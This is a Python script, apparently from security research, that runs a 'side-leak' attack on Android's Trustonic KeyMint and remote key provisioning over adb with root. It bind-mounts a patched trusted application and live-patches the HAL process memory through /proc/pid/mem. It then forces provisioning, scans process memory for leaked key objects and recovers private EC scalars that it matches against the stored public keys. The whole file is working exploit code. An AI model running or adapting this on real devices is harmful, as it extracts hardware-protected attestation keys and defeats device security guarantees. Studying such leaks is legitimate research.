#!/usr/bin/env python3
"""
Run a system RKP side-leak experiment without changing app-visible key blobs.

Flow:
  1. Bind the TA patch that writes the 196-byte keygen object to
     private_out+0x400 but keeps TCI private_len at the stock 216 bytes.
  2. Restart KeyMint so the patched TA is loaded.
  3. Patch the running HAL process memory so its private output vector capacity
     is 0x600 instead of 228 bytes.
  4. Trigger RKPD provisioning.
  5. Before restoring KeyMint, scan HAL rw-p memory for the leaked object
     signature and match recovered scalars against DB public keys.
  6. Always unmount the TA and restart KeyMint.
"""
from __future__ import annotations

import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import tarfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from verify_rkp_sideleak import mul, n  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
TA_LOCAL = ROOT / "patched_ta/0706000000000000000000000000004d.rkp_sideleak.tlbin"
TA_DEV = "/data/local/tmp/0706000000000000000000000000004d.rkp_sideleak.tlbin"
TA_PATH = "/vendor/app/mcRegistry/0706000000000000000000000000004d.tlbin"
HAL_PATH = "/vendor/bin/hw/android.hardware.security.keymint@2.0-service.trustonic"
SERVICE = "android.hardware.security.keymint@2.0-service.trustonic"
INIT_SERVICE = "vendor.keymint-trustonic"
SIG = bytes.fromhex("3c000000070000000a00001001000000")
OBJECT_LEN = 196
SCALAR_OFFSET = 0x98
PATCHES = {
    0x1D1B0: bytes.fromhex("08c08052"),  # mov w8,#0x600
    0x1D1B8: bytes.fromhex("01c08052"),  # mov w1,#0x600
}
WAIT_SECONDS = int(os.environ.get("RKP_MEMSCAN_WAIT_SECONDS", "90"))


def run(cmd: list[str], *, input_bytes: bytes | None = None, check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        input=input_bytes,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=check,
    )


def adb_shell(script: str, *, check: bool = True) -> subprocess.CompletedProcess:
    return run(["adb", "shell", "su", "-c", "sh"], input_bytes=script.encode(), check=check)


def adb_su(cmd: str, *, check: bool = True) -> str:
    cp = run(["adb", "shell", "su", "-c", cmd], check=check)
    return cp.stdout.decode(errors="replace").replace("\n", "")


def adb_exec_out(cmd: str, *, check: bool = True) -> bytes:
    cp = run(["adb", "exec-out", "su", "-c", cmd], check=check)
    return cp.stdout


def write_proc_mem(pid: str, addr: int, data: bytes) -> None:
    cmd = f"dd of=/proc/{pid}/mem bs=1 oflag=seek_bytes seek={hex(addr)} conv=notrunc status=none"
    run(["adb", "shell", "su", "-c", cmd], input_bytes=data)


def read_proc_mem(pid: str, addr: int, size: int) -> bytes:
    cmd = f"dd if=/proc/{pid}/mem bs=4096 iflag=skip_bytes,count_bytes skip={hex(addr)} count={size} status=none"
    return adb_exec_out(cmd, check=False)


def first_mapping_base(pid: str) -> int:
    maps = adb_su(f"cat /proc/{pid}/maps")
    for line in maps.splitlines():
        if SERVICE in line:
            return int(line.split("-", 1)[0], 16)
    raise RuntimeError("HAL mapping base not found")


def patch_hal_memory(run_dir: Path) -> dict:
    pid = adb_su(f"pidof {SERVICE}").strip()
    if not pid:
        raise RuntimeError("KeyMint HAL pid not found")
    base = first_mapping_base(pid)
    result = {"pid": pid, "base": hex(base), "patches": []}
    for off, new_bytes in PATCHES.items():
        addr = base + off
        before = read_proc_mem(pid, addr, 4)
        write_proc_mem(pid, addr, new_bytes)
        after = read_proc_mem(pid, addr, 4)
        item = {"offset": hex(off), "addr": hex(addr), "before": before.hex(), "after": after.hex()}
        result["patches"].append(item)
        if after != new_bytes:
            raise RuntimeError(f"HAL memory patch failed at {off:#x}: {item}")
    (run_dir / "device_logs/hal_mem_patch_summary.json").write_text(json.dumps(result, indent=2) + "\n")
    return result


def trigger_provisioning(dev_run: str) -> None:
    adb_shell(
        f"""
set -x
DEV_RUN='{dev_run}'
mkdir -p "$DEV_RUN/logs" "$DEV_RUN/backup"
logcat -c
pm clear com.android.rkpdapp > "$DEV_RUN/logs/pm_clear.out" 2> "$DEV_RUN/logs/pm_clear.err"
am broadcast -n com.android.rkpdapp/.BootReceiver -a android.intent.action.BOOT_COMPLETED > "$DEV_RUN/logs/bootreceiver.out" 2> "$DEV_RUN/logs/bootreceiver.err"
cmd jobscheduler run -f com.android.rkpdapp 26 > "$DEV_RUN/logs/force_jobs_26.txt" 2>&1
true >> "$DEV_RUN/logs/force_jobs_26.txt"
cmd jobscheduler run -f com.android.rkpdapp 27 > "$DEV_RUN/logs/force_jobs_27.txt" 2>&1
true >> "$DEV_RUN/logs/force_jobs_27.txt"
"""
    )


def pull_rkpd_data(run_dir: Path, dev_run: str, name: str) -> Path:
    adb_shell(
        f"""
set -x
DEV_RUN='{dev_run}'
logcat -d > "$DEV_RUN/logs/full_logcat.txt"
logcat -d | grep -Ei 'Rkpd|RemoteProvision|TlcKM|KeyMint|Certificate|provision|returnCode|Failed|error|sign|avc|denied|execv' > "$DEV_RUN/logs/filtered_logcat.txt"
tar -cf "$DEV_RUN/backup/{name}" /data/user/0/com.android.rkpdapp 2> "$DEV_RUN/logs/tar.err"
tar -cf "/data/local/tmp/{run_dir.name}.tar" -C /data/local/tmp "{run_dir.name}"
"""
    )
    tar_path = run_dir / f"{run_dir.name}.tar"
    pull = run(["adb", "pull", f"/data/local/tmp/{run_dir.name}.tar", str(tar_path)], check=False)
    (run_dir / "device_logs/adb_pull_run_tar.txt").write_bytes(pull.stdout + pull.stderr)
    raw = run_dir / "raw"
    raw.mkdir(exist_ok=True)
    with tarfile.open(tar_path) as tf:
        tf.extractall(raw)
    extracted = run_dir / "extracted"
    extracted.mkdir(exist_ok=True)
    db_tar = raw / run_dir.name / "backup" / name
    with tarfile.open(db_tar) as tf:
        tf.extractall(extracted)
    return extracted / "data/user/0/com.android.rkpdapp/databases/rkpd_database"


def load_db_public_keys(db: Path) -> list[dict]:
    con = sqlite3.connect(db)
    try:
        rows = con.execute("select rowid, length(key_blob), key_blob, public_key from provisioned_keys order by rowid").fetchall()
    finally:
        con.close()
    out = []
    for rowid, blob_len, blob, pub in rows:
        out.append({"rowid": rowid, "key_blob_len": blob_len, "key_blob": blob, "public_key": pub})
    return out


def parse_maps(pid: str) -> list[tuple[int, int, str, str]]:
    maps = adb_su(f"cat /proc/{pid}/maps")
    regions = []
    for line in maps.splitlines():
        parts = line.split(None, 5)
        if len(parts) < 5:
            continue
        rng, perms = parts[0], parts[1]
        path = parts[5] if len(parts) > 5 else ""
        if not perms.startswith("rw-p"):
            continue
        start_s, end_s = rng.split("-", 1)
        start, end = int(start_s, 16), int(end_s, 16)
        size = end - start
        if size <= 0 or size > 128 * 1024 * 1024:
            continue
        regions.append((start, end, perms, path))
    return regions


def scan_hal_memory(run_dir: Path, pid: str, db_rows: list[dict]) -> dict:
    scan_dir = run_dir / "hal_mem_scan"
    scan_dir.mkdir(exist_ok=True)
    pub_to_row = {row["public_key"].hex(): row for row in db_rows}
    hits = []
    regions = parse_maps(pid)
    for idx, (start, end, perms, path) in enumerate(regions):
        size = end - start
        data = read_proc_mem(pid, start, size)
        if not data:
            continue
        pos = 0
        while True:
            hit = data.find(SIG, pos)
            if hit < 0:
                break
            obj = data[hit : hit + OBJECT_LEN]
            scalar = obj[SCALAR_OFFSET : SCALAR_OFFSET + 32]
            k = int.from_bytes(scalar, "big")
            matched_rowid = None
            public_xy = None
            if 1 <= k < n:
                derived = mul(k)
                if derived:
                    x, y = derived
                    public_xy = x.to_bytes(32, "big") + y.to_bytes(32, "big")
                    row = pub_to_row.get(public_xy.hex())
                    if row:
                        matched_rowid = row["rowid"]
            name = f"hit_{len(hits):03d}_region_{idx:03d}_{start+hit:x}.bin"
            (scan_dir / name).write_bytes(obj)
            hits.append(
                {
                    "region_index": idx,
                    "region_start": hex(start),
                    "region_end": hex(end),
                    "addr": hex(start + hit),
                    "path": path,
                    "object_file": str(scan_dir / name),
                    "object_sha256": __import__("hashlib").sha256(obj).hexdigest(),
                    "scalar_hex": scalar.hex(),
                    "public_xy_hex": public_xy.hex() if public_xy else None,
                    "matched_db_rowid": matched_rowid,
                }
            )
            pos = hit + 1
    summary = {
        "pid": pid,
        "regions_scanned": len(regions),
        "db_rows": [{"rowid": r["rowid"], "key_blob_len": r["key_blob_len"], "public_key_hex": r["public_key"].hex()} for r in db_rows],
        "hits": hits,
        "matched_rowids": sorted({h["matched_db_rowid"] for h in hits if h["matched_db_rowid"] is not None}),
    }
    (scan_dir / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
    return summary


def restore(dev_run: str) -> None:
    adb_shell(
        f"""
set -x
DEV_RUN='{dev_run}'
TA_PATH='{TA_PATH}'
mkdir -p "$DEV_RUN/logs"
umount "$TA_PATH" 2> "$DEV_RUN/logs/umount_ta.err"
sha256sum "{TA_PATH}" "{HAL_PATH}" > "$DEV_RUN/logs/final_stock_hashes_before_restart.txt"
stop {INIT_SERVICE}
sleep 1
start {INIT_SERVICE}
sleep 3
getprop init.svc.{INIT_SERVICE} > "$DEV_RUN/logs/final_keymint_service.txt"
pidof {SERVICE} > "$DEV_RUN/logs/final_keymint_pid.txt"
RUN_ID=$(basename "$DEV_RUN")
tar -cf "/data/local/tmp/$RUN_ID.tar" -C /data/local/tmp "$RUN_ID"
""",
        check=False,
    )


def main() -> None:
    run_id = "system_sideleak_stocklen_memscan_" + time.strftime("%Y%m%d_%H%M%S")
    run_dir = ROOT / "rkp_research" / run_id
    dev_run = f"/data/local/tmp/{run_id}"
    (run_dir / "device_logs").mkdir(parents=True)
    (run_dir / "RUN_ID.txt").write_text(run_id + "\n")
    (run_dir / "DEV_RUN.txt").write_text(dev_run + "\n")

    try:
        adb_su(f"rm -f {TA_DEV}", check=False)
        push = run(["adb", "push", str(TA_LOCAL), TA_DEV])
        (run_dir / "device_logs/adb_push_ta.txt").write_bytes(push.stdout + push.stderr)
        preflight = adb_shell(
            f"""
set -x
DEV_RUN='{dev_run}'
mkdir -p "$DEV_RUN/logs" "$DEV_RUN/backup"
chmod 644 '{TA_DEV}'
chcon u:object_r:mobicore_vendor_file:s0 '{TA_DEV}'
date
sha256sum '{TA_PATH}' '{HAL_PATH}'
getprop init.svc.{INIT_SERVICE}
ls -lZ '{TA_DEV}'
"""
        )
        (run_dir / "device_logs/preflight.txt").write_bytes(preflight.stdout + preflight.stderr)

        bind_start = adb_shell(
            f"""
set -x
DEV_RUN='{dev_run}'
stop {INIT_SERVICE}
sleep 1
mount --bind '{TA_DEV}' '{TA_PATH}'
sha256sum '{TA_PATH}' '{HAL_PATH}' > "$DEV_RUN/logs/bind_hashes.txt"
ls -lZ '{TA_PATH}' '{HAL_PATH}' > "$DEV_RUN/logs/bind_contexts.txt"
start {INIT_SERVICE}
sleep 5
getprop init.svc.{INIT_SERVICE} > "$DEV_RUN/logs/keymint_after_ta_restart.txt"
pidof {SERVICE} > "$DEV_RUN/logs/keymint_pid_after_ta_restart.txt"
"""
        )
        (run_dir / "device_logs/bind_start.txt").write_bytes(bind_start.stdout + bind_start.stderr)

        patch_info = patch_hal_memory(run_dir)
        trigger_provisioning(dev_run)
        time.sleep(WAIT_SECONDS)
        db = pull_rkpd_data(run_dir, dev_run, "rkpdapp_data_after_stocklen_memscan.tar")
        rows = load_db_public_keys(db)
        summary = scan_hal_memory(run_dir, patch_info["pid"], rows)
        (run_dir / "result_summary.json").write_text(json.dumps(summary, indent=2) + "\n")
    finally:
        restore(dev_run)
        final_pull = run(["adb", "pull", f"/data/local/tmp/{run_id}.tar", str(run_dir / f"{run_id}.tar")], check=False)
        (run_dir / "device_logs/final_adb_pull_run_tar.txt").write_bytes(final_pull.stdout + final_pull.stderr)
        latest = ROOT / "rkp_research/LATEST_SYSTEM_SIDELEAK_STOCKLEN_MEMSCAN.txt"
        latest.write_text(str(run_dir) + "\n")

    print(f"HOST_RUN={run_dir}")
    result = json.loads((run_dir / "result_summary.json").read_text())
    print("db_rows", len(result["db_rows"]))
    print("hits", len(result["hits"]))
    print("matched_rowids", result["matched_rowids"])


if __name__ == "__main__":
    main()
